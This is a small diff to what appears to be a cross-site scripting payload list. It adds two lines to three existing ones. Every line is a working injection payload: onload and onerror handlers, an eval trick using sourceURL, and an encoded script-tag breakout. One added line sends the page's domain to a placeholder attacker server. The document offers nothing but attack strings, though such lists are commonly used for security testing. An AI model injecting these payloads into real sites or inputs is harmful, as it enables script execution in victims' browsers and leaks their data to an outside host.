@@ -1,3 +1,5 @@
+<iframe/onload=aaajavascipt:alert(1)>
+<svg/onload=location/**/='https://your.server/'+document.domain>
 document.body.innerHTML=eval('Error``.stack//# sourceURL=http://\u{3c}img/src/onerror=alert(1)\u{3e}//')
 "/>&lt;script>alert(1)&lt;/script&gt"/>
 <svg onload=alert(1)>
